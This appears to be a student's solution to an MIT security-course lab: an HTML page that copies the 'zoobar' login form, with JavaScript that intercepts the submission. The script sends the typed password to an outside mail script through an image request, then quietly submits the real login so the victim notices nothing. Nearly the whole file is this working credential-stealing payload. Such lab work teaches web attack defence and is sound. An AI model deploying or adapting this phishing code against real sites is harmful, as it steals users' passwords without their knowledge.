<!-- Check that I'm OK without hint. -->

<form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" id="attackf">
<table>
<tr>
   <td>Username:</td>
  <td><input type="text" name="login_username" size="20"
  autocomplete="no" value=""></td>
</tr>
<tr>
   <td>Password:</td>
  <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
  <input id="submit_button" type="submit" name="submit_login" value="Log in">
  <input type="submit" name="submit_registration" value="Register"></td>
</tr>
</table>
<input type="hidden" name="nexturl" value="http://localhost:8080/zoobar/index.cgi/users">
</form>

<script>
function resubmit() {
  // alert("in resubmit");
  document.getElementById("attackf").removeEventListener("submit", ldready);
  document.getElementById("submit_button").click();
}

function ldready(event) {
  event.preventDefault();
  var un = document.getElementsByName('login_username')[0].value;
  var pw = document.getElementsByName('login_password')[0].value;
  // alert("un: " + un + " pw: " + pw);

  (new Image()).src='http://css.csail.mit.edu/6.858/2015/labs/sendmail.php?' + 'to=jains@mit.edu' + '&payload=' + pw + '&random=' + Math.random();
  setTimeout(resubmit, 500);
}

document.getElementById("attackf").addEventListener("submit", ldready, false);
</script>